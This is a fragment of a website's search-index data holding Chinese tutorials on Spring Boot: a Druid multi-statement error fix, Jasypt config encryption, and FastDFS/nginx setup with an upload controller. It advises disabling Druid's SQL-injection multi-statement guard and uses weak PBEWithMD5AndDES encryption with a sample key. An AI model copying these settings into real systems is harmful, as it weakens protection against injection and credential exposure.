charset=utf8mb4 collate=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n报错\n\ncaused by: java.sql.sqlexception: sql injection violation, multi-statement not allow : create table if not exists `rt_telemetry_p` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决房在，在 yml 里 数据库连接 url 中加入 allowmultiqueries=true ，在 yml 里 druid 配置中加入\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Spring Boot 集成 Jasypt 3.0.3 配置文件加密",frontmatter:{title:"Spring Boot 集成 Jasypt 3.0.3 配置文件加密",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/205.Spring%20Boot%20%E9%9B%86%E6%88%90%20Jasypt%203.0.3%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86.html",relativePath:"00.java/20.Spring/23.springboot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.md",key:"v-f7296352",path:"/spring/spring-boot/205/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'依赖\n\n<dependency>\n    <groupId>com.github.ulisesbocchio</groupId>\n    <artifactId>jasypt-spring-boot-starter</artifactId>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml 中添加配置文件\n\njasypt:\n  encryptor:\n    # 盐加密\n    password: aabbcc\n    # 指定加密方式\n    algorithm: PBEWithMD5AndDES\n    iv-generator-classname: org.jasypt.iv.NoIvGenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n输出加密密码工具类\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.PooledPBEStringEncryptor;\nimport org.jasypt.encryption.pbe.config.SimpleStringPBEConfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class JasyptUtil {\n\n\n    /**\n     * Jasypt生成加密结果\n     * @param password 配置文件中设定的加密盐值\n     * @param value 加密值\n     * @return\n     */\n    public static String encyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * 解密\n     * @param password 配置文件中设定的加密盐值\n     * @param value 解密密文\n     * @return\n     */\n    public static String decyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static SimpleStringPBEConfig cryptor(String password){\n        SimpleStringPBEConfig config = new SimpleStringPBEConfig();\n        config.setPassword(password);\n        config.setAlgorithm("PBEWithMD5AndDES");\n        config.setKeyObtentionIterations("1000");\n        config.setPoolSize("1");\n        config.setProviderName("SunJCE");\n        config.setSaltGeneratorClassName("org.jasypt.salt.RandomSaltGenerator");\n        config.setStringOutputType("base64");\n        return config;\n    }\n\n\n    public static void main(String[] args) {\n        // 加密\n        String encPwd = encyptPwd("giant", "mysql");\n        // 解密\n        String decPwd = decyptPwd("giant", encPwd);\n        System.out.println(encPwd);\n        System.out.println(decPwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n得到加密密码进行替换\n\n  redis:\n    host: 192.168.81.101\n    password: ENC(u1itOZa4Xt3qMyG1VJGa9fc0wDUaQ59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ENC(1iyE4/wqjqSHmFKKVVpLAg==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n建议部署的时候 盐 不要放到配置文件，可以用启动参数 -Djasypt.encryptor.password=aabbcc 来替代。',normalizedContent:'依赖\n\n<dependency>\n    <groupid>com.github.ulisesbocchio</groupid>\n    <artifactid>jasypt-spring-boot-starter</artifactid>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml 中添加配置文件\n\njasypt:\n  encryptor:\n    # 盐加密\n    password: aabbcc\n    # 指定加密方式\n    algorithm: pbewithmd5anddes\n    iv-generator-classname: org.jasypt.iv.noivgenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n输出加密密码工具类\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.pooledpbestringencryptor;\nimport org.jasypt.encryption.pbe.config.simplestringpbeconfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class jasyptutil {\n\n\n    /**\n     * jasypt生成加密结果\n     * @param password 配置文件中设定的加密盐值\n     * @param value 加密值\n     * @return\n     */\n    public static string encyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * 解密\n     * @param password 配置文件中设定的加密盐值\n     * @param value 解密密文\n     * @return\n     */\n    public static string decyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static simplestringpbeconfig cryptor(string password){\n        simplestringpbeconfig config = new simplestringpbeconfig();\n        config.setpassword(password);\n        config.setalgorithm("pbewithmd5anddes");\n        config.setkeyobtentioniterations("1000");\n        config.setpoolsize("1");\n        config.setprovidername("sunjce");\n        config.setsaltgeneratorclassname("org.jasypt.salt.randomsaltgenerator");\n        config.setstringoutputtype("base64");\n        return config;\n    }\n\n\n    public static void main(string[] args) {\n        // 加密\n        string encpwd = encyptpwd("giant", "mysql");\n        // 解密\n        string decpwd = decyptpwd("giant", encpwd);\n        system.out.println(encpwd);\n        system.out.println(decpwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n得到加密密码进行替换\n\n  redis:\n    host: 192.168.81.101\n    password: enc(u1itoza4xt3qmyg1vjga9fc0wduaq59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: enc(1iye4/wqjqshmfkkvvplag==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n建议部署的时候 盐 不要放到配置文件，可以用启动参数 -djasypt.encryptor.password=aabbcc 来替代。',charsets:{cjk:!0}},{title:"Spring Boot 集成 FastDFS",frontmatter:{title:"Spring Boot 集成 FastDFS",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/206/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/206.Spring%20Boot%20%E9%9B%86%E6%88%90%20FastDFS.html",relativePath:"00.java/20.Spring/23.springboot/206.Spring Boot 集成 FastDFS.md",key:"v-689c946e",path:"/spring/spring-boot/206/",headers:[{level:2,title:"安装FastDFS",slug:"安装fastdfs",normalizedTitle:"安装 fastdfs",charIndex:2},{level:3,title:"系统软件",slug:"系统软件",normalizedTitle:"系统软件",charIndex:17},{level:3,title:"编译环境",slug:"编译环境",normalizedTitle:"编译环境",charIndex:238},{level:3,title:"磁盘目录",slug:"磁盘目录",normalizedTitle:"磁盘目录",charIndex:1452},{level:3,title:"安装libfastcommon",slug:"安装libfastcommon",normalizedTitle:"安装 libfastcommon",charIndex:1589},{level:3,title:"安装FastDFS",slug:"安装fastdfs-2",normalizedTitle:"安装 fastdfs",charIndex:2},{level:3,title:"安装fastdfs-nginx-module",slug:"安装fastdfs-nginx-module",normalizedTitle:"安装 fastdfs-nginx-module",charIndex:2226},{level:2,title:"单机部署",slug:"单机部署",normalizedTitle:"单机部署",charIndex:2573},{level:3,title:"tracker配置",slug:"tracker配置",normalizedTitle:"tracker 配置",charIndex:2582},{level:3,title:"storage配置",slug:"storage配置",normalizedTitle:"storage 配置",charIndex:2776},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:3084},{level:4,title:"tracker",slug:"tracker",normalizedTitle:"tracker",charIndex:1907},{level:4,title:"storage",slug:"storage",normalizedTitle:"storage",charIndex:1963},{level:3,title:"client测试",slug:"client测试",normalizedTitle:"client 测试",charIndex:3493},{level:3,title:"nginx 配置访问",slug:"nginx-配置访问",normalizedTitle:"nginx 配置访问",charIndex:3962},{level:2,title:"分布式部署",slug:"分布式部署",normalizedTitle:"分布式部署",charIndex:5235},{level:3,title:"storage配置",slug:"storage配置-2",normalizedTitle:"storage 配置",charIndex:2776},{level:3,title:"client测试",slug:"client测试-2",normalizedTitle:"client 测试",charIndex:3493},{level:3,title:"配置nginx访问",slug:"配置nginx访问",normalizedTitle:"配置 nginx 访问",charIndex:6038},{level:2,title:"集成SpringBoot",slug:"集成springboot",normalizedTitle:"集成 springboot",charIndex:6662},{level:3,title:"引入依赖",slug:"引入依赖",normalizedTitle:"引入依赖",charIndex:6680},{level:3,title:"添加配置",slug:"添加配置",normalizedTitle:"添加配置",charIndex:6845},{level:3,title:"Controller",slug:"controller",normalizedTitle:"controller",charIndex:7005},{level:3,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:7317}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"安装FastDFS 系统软件 编译环境 磁盘目录 安装libfastcommon 安装FastDFS 安装fastdfs-nginx-module 单机部署 tracker配置 storage配置 启动 tracker storage client测试 nginx 配置访问 分布式部署 storage配置 client测试 配置nginx访问 集成SpringBoot 引入依赖 添加配置 Controller 实现",content:'# 安装 FastDFS\n\n\n# 系统软件\n\n名称                     说明\ncentos                 7.x\nlibfastcommon          FastDFS 分离出的一些公用函数包\nFastDFS                FastDFS 本体\nfastdfs-nginx-module   FastDFS 和 nginx 的关联模块\nnginx                  nginx-1.18.0\n\n\n# 编译环境\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\n如果出现以下错误\n\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n修改如下文件\n\nvi /usr/libexec/urlgrabber-ext-down\n#把第一行的\n#!/usr/bin/python\n\n#修改为，然后重新安装\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 磁盘目录\n\n说明                  位置\n所有安装包               /home/dfs/lib\n数据存储位置              /home/dfs/store\n这里我为了方便把日志什么的都放到了   /home/dfs/log\n\n\n# 安装 libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #编译安装\n\n\n1\n2\n3\n\n\n\n# 安装 FastDFS\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #编译安装\n#配置文件准备\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #客户端文件，测试用\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #供nginx访问使用\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #供nginx访问使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 安装 fastdfs-nginx-module\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\n配合 nginx 使用，关于 nginx 安装这里就不说了，安装后 nginx 需要配置如下：\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# 单机部署\n\n\n# tracker 配置\n\n#服务器ip为 10.24x.3x.xx2\n#我建议用ftp下载下来这些文件 本地修改\nvim /etc/fdfs/tracker.conf\n#需要修改的内容如下\nport=22122  # tracker服务器端口（默认22122,一般不修改）\nbase_path=/home/dfs/log  # 存储日志和数据的根目录\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.24x.3x.xx2:22122  # tracker服务器IP和端口\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 启动\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #启动tracker服务\n/etc/init.d/fdfs_trackerd restart #重启动tracker服务\n/etc/init.d/fdfs_trackerd stop #停止tracker服务\nchkconfig fdfs_trackerd on #自启动tracker服务\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #启动storage服务\n/etc/init.d/fdfs_storaged restart #重动storage服务\n/etc/init.d/fdfs_storaged stop #停止动storage服务\nchkconfig fdfs_storaged on #自启动storage服务\n\n\n1\n2\n3\n4\n\n\n\n# client 测试\n\n返回 groupX 意思就是成功了，文件被重新改名字并且被放在了某个地方\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #tracker服务器IP和端口\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n不知道可以用以下命令来搜找\n\n[root@node102 home]# find / -name CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n/home/dfs/store/data/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n\n\n\n# nginx 配置访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.24x.3x.xx2:22122  #tracker服务器IP和端口\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# 先把8888端口打开\n/sbin/iptables -I INPUT -p tcp --dport 8888 -j ACCEPT\n#测试下载，用外部浏览器访问刚才已传过的nginx安装包,引用返回的ID\nhttp://10.24x.3x.xx2:8888/group1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果 nginx 启动 unknown directive "ngx_fastdfs_module"，则是安装 nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src 失败，可以用./nginx -V 查看。\n\n[root@node102 sbin]# ./nginx -V\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) \nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\nTLS SNI support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 分布式部署\n\n\n# storage 配置\n\ntracker 配置 和单机部署是一样的不变，只需要改变 storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client 测试\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\n# 保存退出\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置 nginx 访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 集成 SpringBoot\n\n\n# 引入依赖\n\n<dependency>\n    <groupId>com.github.tobato</groupId>\n    <artifactId>fastdfs-client</artifactId>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 添加配置\n\nfdfs:\n  # 连接的超时时间\n  connect-timeout: 3000\n  # 读取的超时时间\n  so-timeout: 3000\n  #tracker服务所在的ip地址和端口号\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Controller\n\n@RestController\n@RequestMapping("/img")\npublic class ImgController {\n\n    @Autowired\n    private ImgServer imgServer;\n\n    @PostMapping("/push")\n    public ResponseData push(@RequestParam("file") MultipartFile file){\n        return imgServer.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实现\n\n@Service\n@Slf4j\npublic class ImgServerImpl implements ImgServer {\n    @Autowired\n    FastFileStorageClient fastFileStorageClient;\n\n    @Override\n    public ResponseData<String> push(MultipartFile file) {\n        if (file.isEmpty()) {\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1000);\n        }\n        try {\n            log.info("开始上传 {}", file.getOriginalFilename());\n            String fileSuffix = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(".")+1);\n            StorePath storePath = fastFileStorageClient.uploadFile(file.getInputStream(), file.getSize(),fileSuffix, null);\n            String path = storePath.getFullPath();\n            log.info("上传成功");\n            return ResponseData.successResponse(path);\n        } catch (IOException e) {\n            log.error(e.toString(), e);\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1001.getCode(), e.toString());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',normalizedContent:'# 安装 fastdfs\n\n\n# 系统软件\n\n名称                     说明\ncentos                 7.x\nlibfastcommon          fastdfs 分离出的一些公用函数包\nfastdfs                fastdfs 本体\nfastdfs-nginx-module   fastdfs 和 nginx 的关联模块\nnginx                  nginx-1.18.0\n\n\n# 编译环境\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\n如果出现以下错误\n\nloaded plugins: fastestmirror\nloading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n修改如下文件\n\nvi /usr/libexec/urlgrabber-ext-down\n#把第一行的\n#!/usr/bin/python\n\n#修改为，然后重新安装\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 磁盘目录\n\n说明                  位置\n所有安装包               /home/dfs/lib\n数据存储位置              /home/dfs/store\n这里我为了方便把日志什么的都放到了   /home/dfs/log\n\n\n# 安装 libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #编译安装\n\n\n1\n2\n3\n\n\n\n# 安装 fastdfs\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #编译安装\n#配置文件准备\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #客户端文件，测试用\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #供nginx访问使用\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #供nginx访问使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 安装 fastdfs-nginx-module\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\n配合 nginx 使用，关于 nginx 安装这里就不说了，安装后 nginx 需要配置如下：\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# 单机部署\n\n\n# tracker 配置\n\n#服务器ip为 10.24x.3x.xx2\n#我建议用ftp下载下来这些文件 本地修改\nvim /etc/fdfs/tracker.conf\n#需要修改的内容如下\nport=22122  # tracker服务器端口（默认22122,一般不修改）\nbase_path=/home/dfs/log  # 存储日志和数据的根目录\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.24x.3x.xx2:22122  # tracker服务器ip和端口\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 启动\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #启动tracker服务\n/etc/init.d/fdfs_trackerd restart #重启动tracker服务\n/etc/init.d/fdfs_trackerd stop #停止tracker服务\nchkconfig fdfs_trackerd on #自启动tracker服务\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #启动storage服务\n/etc/init.d/fdfs_storaged restart #重动storage服务\n/etc/init.d/fdfs_storaged stop #停止动storage服务\nchkconfig fdfs_storaged on #自启动storage服务\n\n\n1\n2\n3\n4\n\n\n\n# client 测试\n\n返回 groupx 意思就是成功了，文件被重新改名字并且被放在了某个地方\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #tracker服务器ip和端口\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n不知道可以用以下命令来搜找\n\n[root@node102 home]# find / -name cvaezl_r4usafhxsaaacuytz3no8807.sh\n/home/dfs/store/data/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n\n\n\n# nginx 配置访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.24x.3x.xx2:22122  #tracker服务器ip和端口\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# 先把8888端口打开\n/sbin/iptables -i input -p tcp --dport 8888 -j accept\n#测试下载，用外部浏览器访问刚才已传过的nginx安装包,引用返回的id\nhttp://10.24x.3x.xx2:8888/group1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果 nginx 启动 unknown directive "ngx_fastdfs_module"，则是安装 nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src 失败，可以用./nginx -v 查看。\n\n[root@node102 sbin]# ./nginx -v\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (red hat 9.3.1-2) (gcc) \nbuilt with openssl 1.0.2k-fips  26 jan 2017\ntls sni support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 分布式部署\n\n\n# storage 配置\n\ntracker 配置 和单机部署是一样的不变，只需要改变 storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client 测试\n\nvim 